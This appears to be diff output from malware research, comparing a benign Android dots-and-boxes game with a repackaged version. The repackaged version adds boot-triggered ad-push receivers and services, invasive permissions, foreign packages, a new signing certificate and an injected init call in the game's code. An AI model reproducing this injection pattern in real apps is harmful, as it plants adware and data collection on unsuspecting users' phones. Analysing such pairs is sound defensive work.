@@ -1,0 +1,271 @@
+diff -r result/APP_84/App_B_84/AndroidManifest.xml result/APP_84/App_M_84/AndroidManifest.xml
+11a12,39
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.slegl.push.MainActivity"/>
+>         <service android:name="com.slegl.push.MainService"/>
+>         <receiver android:name="com.slegl.push.MainReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:name="net.cadegessdad.iad.AdPushActivity"/>
+>         <receiver android:name="net.cadegessdad.iad.AdPushReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="net.cadegessdad.iad.AdPushService"/>
+>         <meta-data android:name="INIT_KEY" android:value="d70eb551881f496da4c013e130f3be83,10498,slhxpy7p2pl1legp,20121122,1"/>
+>         <meta-data android:name="UMENG_APPKEY" android:value="500fc8cf5270155c50000017"/>
+>         <meta-data android:name="UMENG_CHANNEL" android:value="gfan"/>
+12a41,54
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+>     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+>     <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+>     <uses-permission android:name="android.permission.VIBRATE"/>
+>     <uses-permission android:name="com.android.vending.BILLING"/>
+diff -r result/APP_84/App_B_84/apktool.yml result/APP_84/App_M_84/apktool.yml
+2c2
+< apkFileName: Bapp84-C11C411C3BE3FB59250DFD525AE49F2B931BFEEED9C85B45D1EFB075331FB581.apk
+---
+> apkFileName: Mapp84-47618CC9EDE3CD0F28AD6482BA7B0E6609279DFBEAF336F3F0E0D2B598148184.apk
+5d4
+< - resources.arsc
+Somente em result/APP_84/App_M_84/: assets
+Somente em result/APP_84/App_M_84/com: geseng
+Somente em result/APP_84/App_M_84/com: slegl
+Somente em result/APP_84/App_M_84/com: umeng
+diff -r result/APP_84/App_B_84/com/wigball/android/games/dotsandboxes/b.java result/APP_84/App_M_84/com/wigball/android/games/dotsandboxes/b.java
+9a10
+> import com.geseng.Dienghla;
+108a110
+>     Dienghla.init(this);
+Somente em result/APP_84/App_M_84/: net
+Os arquivos binários result/APP_84/App_B_84/original/AndroidManifest.xml e result/APP_84/App_M_84/original/AndroidManifest.xml são diferentes
+Somente em result/APP_84/App_B_84/original/META-INF: CERT.RSA
+Somente em result/APP_84/App_B_84/original/META-INF: CERT.SF
+diff -r result/APP_84/App_B_84/original/META-INF/MANIFEST.MF result/APP_84/App_M_84/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.6.0 (Sun Microsystems Inc.)
+5,8c5
+< SHA1-Digest: CVxCk3FsRGmoGBklTARbI+JpNKQ=
+< 
+< Name: res/drawable/start_btn_layout.xml
+< SHA1-Digest: KIB06q+2sJqBXUHGj/+bCYTYp6E=
+---
+> SHA1-Digest: top6uMozgjLbSgJbPr2yzlRAqWQ=
+12a10,12
+> Name: res/drawable/start_btn_layout.xml
+> SHA1-Digest: 6tLXHLUlmNQ/lfPWUOZ+74DQK7A=
+> 
+16,26c16,17
+< Name: res/drawable/rounded_rectangle_selected.xml
+< SHA1-Digest: GpoOFdmjsO8NfLswFpIEe0YCq1Y=
+< 
+< Name: res/drawable-de/title_logo.png
+< SHA1-Digest: r0FXXiw4KyFJr0e6ueaj3Sy+7V8=
+< 
+< Name: res/layout/authenticate.xml
+< SHA1-Digest: Ax7r8KqO5IN8jTpi7FOobQy+TqU=
+< 
+< Name: resources.arsc
+< SHA1-Digest: oHw/pWJZoA3KUP5RN053HBELYko=
+---
+> Name: assets/tosleng/spot_light.png
+> SHA1-Digest: HDYglOL1e3Rk0VmuY8QCQ0oNoTs=
+30a22,24
+> Name: assets/tosleng/push_cancel_btn.png
+> SHA1-Digest: xFZxC1NS0KoZjvtGL4hUEAZ1oMM=
+> 
+34,36d27
+< Name: res/drawable-hdpi/menu_exit.png
+< SHA1-Digest: P1uvbtgMZ6Cr+oezlAGYdzVX8Xs=
+< 
+40,48d30
+< Name: AndroidManifest.xml
+< SHA1-Digest: tsDi5NGZg7GO4d7TN7H7MFniYTo=
+< 
+< Name: res/drawable/number2.png
+< SHA1-Digest: 1uA/M+5b7F66TckCtDsmMgm95nI=
+< 
+< Name: res/layout/inputtext_dialog.xml
+< SHA1-Digest: inCKMS/S/14WUCgUjToNBTGR0FU=
+< 
+51a34,36
+> Name: res/layout/inputtext_dialog.xml
+> SHA1-Digest: MdO+fnzhS/GuT3e3Y+i4SEbli5g=
+> 
+53c38
+< SHA1-Digest: X1S2TlUfRsos+06/fWSAvLBisLc=
+---
+> SHA1-Digest: pySc4G0nV9rRB8ORi5x9y1WlhRU=
+57a43,105
+> Name: res/drawable-hdpi/menu_restart.png
+> SHA1-Digest: 3PUtTGSsCEL6KzVqIkuNMma1ojg=
+> 
+> Name: res/layout/start.xml
+> SHA1-Digest: V/iq8qfl1Ciq71xCU969Jc88fMg=
+> 
+> Name: res/drawable/kasten_player1.png
+> SHA1-Digest: O2pFIvJ4kaLMNs3rbUCkfTiRj2c=
+> 
+> Name: res/drawable/number7.png
+> SHA1-Digest: 10yYc7TW2M9Nff8IPSpQKnWcFLw=
+> 
+> Name: assets/tosleng/push_cancel_btn_pressed.png
+> SHA1-Digest: CbQHVmHL3PxfmzP+MMFrIUI9vT4=
+> 
+> Name: res/layout/main.xml
+> SHA1-Digest: OKfVpeim3Vm934kCuZVBwM38u20=
+> 
+> Name: res/drawable-mdpi/menu_restart.png
+> SHA1-Digest: pOZI9mZHNOD/M6QPAOkq3DxNbdM=
+> 
+> Name: res/layout/hint_dialog.xml
+> SHA1-Digest: bRocB9FTDY+F8oVI+KuERr16T24=
+> 
+> Name: res/menu/game_menu.xml
+> SHA1-Digest: XJKsP9NkAysXQBPOEyLq0p51UXE=
+> 
+> Name: res/drawable/number3.png
+> SHA1-Digest: cQ1btQxOCehzd+fONDAo3VmYuYE=
+> 
+> Name: assets/tosleng/download_btn2_pressed.png
+> SHA1-Digest: AtUClOw6HmlJO+VrNZ7YD/BWibQ=
+> 
+> Name: res/drawable/rounded_rectangle_selected.xml
+> SHA1-Digest: n5/RC/VAVuGrasougvV2z0wNbsU=
+> 
+> Name: assets/tosleng/spot_default.png
+> SHA1-Digest: E4fi2Oiw3vnkWEnhps2hIa4+gp8=
+> 
+> Name: res/drawable-de/title_logo.png
+> SHA1-Digest: r0FXXiw4KyFJr0e6ueaj3Sy+7V8=
+> 
+> Name: res/layout/authenticate.xml
+> SHA1-Digest: fhbNPG88gVYUI6pmTtg5VKZIn2M=
+> 
+> Name: resources.arsc
+> SHA1-Digest: foZZSEbFQFQwZo6lziuleHEDImo=
+> 
+> Name: res/drawable-hdpi/menu_exit.png
+> SHA1-Digest: P1uvbtgMZ6Cr+oezlAGYdzVX8Xs=
+> 
+> Name: AndroidManifest.xml
+> SHA1-Digest: j94Q8hLFq/jU+/tkbuxHrrLWI1c=
+> 
+> Name: assets/tosleng/confirm_btn.png
+> SHA1-Digest: YuSe5o0DswmLLQmJLeyoTs7alDY=
+> 
+> Name: res/drawable/number2.png
+> SHA1-Digest: 1uA/M+5b7F66TckCtDsmMgm95nI=
+> 
+> Name: assets/tosleng/360.png
+> SHA1-Digest: l+Fj8rnP63ymLQTbbTeI2n7q89k=
+> 
+59c107
+< SHA1-Digest: eK3o4v8qCZBp/YbcDMt4yMrEggQ=
+---
+> SHA1-Digest: uFvo2grR29G+sBoXSckebiKSWC8=
+67,69d114
+< Name: res/drawable-hdpi/menu_restart.png
+< SHA1-Digest: 3PUtTGSsCEL6KzVqIkuNMma1ojg=
+< 
+73,78d117
+< Name: res/layout/start.xml
+< SHA1-Digest: vGVHv4L6jhOB05QRflZ8RhjPNrE=
+< 
+< Name: res/drawable/kasten_player1.png
+< SHA1-Digest: O2pFIvJ4kaLMNs3rbUCkfTiRj2c=
+< 
+82,84d120
+< Name: res/layout/help.xml
+< SHA1-Digest: XrhTtTvp82eEBmj4Kvoxd+tDD54=
+< 
+88,89c124,125
+< Name: res/drawable/winner_background.xml
+< SHA1-Digest: RZ6l6RH4E0QrXKGQWPu92Ucs7AA=
+---
+> Name: res/layout/help.xml
+> SHA1-Digest: 2+S4CFiZd8mlxrknnXJkaEW58Ck=
+91,92c127,131
+< Name: res/drawable/number7.png
+< SHA1-Digest: 10yYc7TW2M9Nff8IPSpQKnWcFLw=
+---
+> Name: assets/tosleng/icon.png
+> SHA1-Digest: xojjGOMaFE9l5JGijGWsO/RgymY=
+> 
+> Name: res/drawable/winner_background.xml
+> SHA1-Digest: PFS+8Jcs6N2QFexhQaeCL/+ZprA=
+96a136,138
+> Name: assets/tosleng/confirm_btn_pressed.png
+> SHA1-Digest: oY/MZIRapnKGabQhUv9sd8CPCbQ=
+> 
+98c140
+< SHA1-Digest: zhY7LfrwGJru5sFdCpxYX6LJ7Uc=
+---
+> SHA1-Digest: kkNNurRTLLQ8EkTL7+WoXNiVV6o=
+101,104c143
+< SHA1-Digest: 8GUgps6eMfOx9GF8e0PxpsStaiI=
+< 
+< Name: res/layout/main.xml
+< SHA1-Digest: L71sOJcYmVEUsmlipBdRYGrnPcM=
+---
+> SHA1-Digest: ksBVSs4Uoubj3PbgZe7v+oT5/yU=
+110c149
+< SHA1-Digest: folfAksqROjcWiEZpXYcUZ6udDg=
+---
+> SHA1-Digest: Z/c7Zy0XlUmURzMcPpjlA/nE3fg=
+115,116c154,155
+< Name: res/drawable-mdpi/menu_restart.png
+< SHA1-Digest: pOZI9mZHNOD/M6QPAOkq3DxNbdM=
+---
+> Name: assets/tosleng/download_btn2.png
+> SHA1-Digest: MBPHHzDxFqdfXsBLtm7DSajWU1w=
+118,119c157,161
+< Name: res/layout/hint_dialog.xml
+< SHA1-Digest: XoDrzY1XsGyB52OzD4A0o9CDulo=
+---
+> Name: assets/tosleng/fold_arrow.png
+> SHA1-Digest: aPV5nrym+b3yv4JxlPO9BHg6+k0=
+> 
+> Name: assets/tosleng/snapshot_empty.png
+> SHA1-Digest: DSmTSCP3TKTP8Cw8/9byyIcYP28=
+126,131d167
+< 
+< Name: res/menu/game_menu.xml
+< SHA1-Digest: HSNIZkD4HNmFhN45nzg1vS2avwI=
+< 
+< Name: res/drawable/number3.png
+< SHA1-Digest: cQ1btQxOCehzd+fONDAo3VmYuYE=
+Somente em result/APP_84/App_M_84/original/META-INF: RANGFEI.RSA
+Somente em result/APP_84/App_M_84/original/META-INF: RANGFEI.SF
+Somente em result/APP_84/App_M_84/smali/com: geseng
+Somente em result/APP_84/App_M_84/smali/com: slegl
+Somente em result/APP_84/App_M_84/smali/com: umeng
+diff -r result/APP_84/App_B_84/smali/com/wigball/android/games/dotsandboxes/b.smali result/APP_84/App_M_84/smali/com/wigball/android/games/dotsandboxes/b.smali
+420a421,422
+>     invoke-static {p0}, Lcom/geseng/Dienghla;->init(Landroid/content/Context;)V
+> 
+Somente em result/APP_84/App_M_84/smali: net
